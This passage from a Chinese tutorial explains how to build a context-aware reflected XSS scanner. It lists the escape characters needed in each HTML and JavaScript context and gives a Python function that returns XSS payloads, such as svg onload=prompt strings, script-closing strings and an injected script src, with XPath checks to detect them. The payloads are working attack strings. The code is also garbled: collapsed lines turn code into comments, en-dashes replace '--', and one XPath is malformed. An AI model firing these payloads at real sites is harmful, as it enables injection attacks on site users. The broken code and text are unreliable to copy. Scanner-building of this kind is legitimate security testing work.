构建上下文分析器是最难的部分，但是当了解其工作原理的时候，这会变得容易一些。

反射XSS类型及其转义。

•HTML标签[2]标签 <> 字符是构造payload的必须项。•HTML属性[3]：空格和等于号(=) 是必须项，单引号(')和双引号(")是可选的。•HTML属性值[4]：直接有效的Payload或者需要逗号(,)才能构造payload。•HTML文本节点[5]：<> 字符需要转义文本区域并构造有效的payload•HTML注释：<>!字符必须用来转义注释并构造有效的payload•Style[6]: <> 需要转义样式并构造有效payload•Style 属性：<,>,"字符需要转义文本并构造payload•Href 属性：直接构造payload，或者“需要转义文本来构造payload•JS 节点：<,>需要转义script，其他特殊的字符来闭合JS变量或函数。

注意：我们不会编写一个高级的扫描器覆盖所有的上下文。

创建一个新的文件为payload_generator.py并创建一个函数为payload_generator。这个payload_generator函数获取上下文，返回从XML树中经过正则匹配的payload。

def payload_generator(context):    payloads = []    if context == 'attribname':        payloads = []        comb = {}
        # check for escaping < >        comb['payload'] = "\"><svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)        comb = {}
        # check for adding new attribute with space        comb['payload'] = " onload=prompt`812132` "        comb['find'] = "//*[@onload[contains(.,812132)]]"        payloads.append(comb)
    if context == 'attribval':        payloads = []        comb = {}
        # check for escaping < >        comb['payload'] = "\"><svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)        comb = {}
        # check for escaping using ' and "        comb['payload'] = "'\" onload=prompt`812132` "        comb['find'] = "//*[@onload[contains(.,812132)]]"        payloads.append(comb)
    if context == 'htmltag':        payloads = []        comb = {}        # check for > <        comb['payload'] = "<svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)
    if context == 'comment':        payloads = []        comb = {}        # check for escaping comment        comb['payload'] = "––><svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)
    if context == 'jssinglequote':        payloads = []        comb = {}        # check for escaping < >        comb['payload'] = "</script><svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)        comb = {}
        # check for escaping using ' and "        comb['payload'] = "'); prompt`812132`;//"        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'        payloads.append(comb)
    if context == "jsnode":        payloads = []        comb = {}        comb['payload'] = "\" src=\"https://test.com\" \""        comb['find'] = "//script[@src[contains(.,https://test.com)]]"        payloads.append(comb)
    if context == 'jsdoublequote':        payloads = []        comb = {}        # check for escaping < >        comb['payload'] = "</script><svg onload=prompt`812132`>"        comb['find'] = "//svg[@onload[contains(.,812132)]]"        payloads.append(comb)        comb = {}
        # check for escaping using ' and "        comb['payload'] = "\")-prompt`812132`-//"        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'        payloads.append(comb)

    return payloads
